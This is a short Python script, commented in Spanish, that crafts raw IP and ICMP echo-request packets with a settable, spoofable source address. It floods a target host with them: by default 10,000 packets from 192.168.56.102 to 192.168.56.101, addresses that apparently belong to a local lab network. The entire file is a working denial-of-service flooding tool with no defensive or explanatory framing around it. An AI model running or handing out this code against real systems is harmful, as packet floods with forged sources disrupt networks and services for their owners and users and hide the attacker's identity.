import socket
import struct
import random
import time
import signal
import sys

ICMP_ECHO_REQUEST = 8  # Tipo de mensaje ICMP para solicitud de eco
IP_PROTO_ICMP = 1      # Protocolo ICMP

# Variable global para controlar si se debe detener el flood
running = True

def signal_handler(sig, frame):
    """
    Manejador de señal para SIGINT (Ctrl+C).
    Detener el flood de ICMP de manera segura.
    """
    global running
    print("\nInterrupción detectada. Deteniendo el flood ICMP...")
    running = False  # Establece la variable a False para detener el flood

signal.signal(signal.SIGINT, signal_handler)

def checksum(source_string):
    """
    Calcular la suma de verificación de un paquete.
    """
    sum = 0
    countTo = (len(source_string) // 2) * 2
    count = 0
    while count < countTo:
        thisVal = struct.unpack("!H", source_string[count:count+2])[0]
        sum = sum + thisVal
        sum = sum & 0xFFFFFFFF  # Asegurarse de que sea de 32 bits
        count = count + 2

    if countTo < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xFFFFFFFF

    sum = (sum >> 16) + (sum & 0xFFFF)
    sum = sum + (sum >> 16)
    checksum = ~sum & 0xFFFF
    return checksum

def create_packet(id, source_ip, dest_ip):
    """
    Crear un paquete IP + ICMP.
    """
    # Encabezado IP
    ip_header = struct.pack("!BBHHHBBH4s4s",
                            0x45, 0, 40, 0, 0, 255, IP_PROTO_ICMP,
                            0, socket.inet_aton(source_ip), socket.inet_aton(dest_ip))

    # Crear paquete ICMP
    icmp_header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, 0, id, 1)
    data = bytes([random.randint(0, 255) for _ in range(56)])  # Datos aleatorios (56 bytes)

    # Calculamos el checksum para el ICMP (solo)
    checksum_value = checksum(icmp_header + data)
    icmp_header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, checksum_value, id, 1)

    # Paquete completo
    packet = ip_header + icmp_header + data
    return packet

def flood_icmp(source_ip, target_ip, packet_count=1000):
    """
    Iniciar el flood de ICMP a un destino.
    """
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)  # Incluir encabezado IP

    packet_id = random.randint(1, 65535)

    print(f"Iniciando flood ICMP hacia {target_ip}...")

    count = 0
    while running and count < packet_count:  # Continuar enviando paquetes hasta que se reciba la señal de interrupción
        packet = create_packet(packet_id, source_ip, target_ip)
        try:
            icmp_socket.sendto(packet, (target_ip, 1))  # Enviar paquete ICMP
            count += 1
            #print(f"Paquete enviado a {target_ip}...")
        except Exception as e:
            print(f"Error al enviar paquete: {e}")

    icmp_socket.close()
    print(f"Flood ICMP detenido. Paquetes enviados: {count}")

if __name__ == "__main__":
    source_ip = "192.168.56.102"  # Dirección IP de origen
    target_ip = "192.168.56.101"  # Dirección IP de destino
    flood_icmp(source_ip, target_ip, packet_count=10000)  # Número de paquetes ICMP a enviar
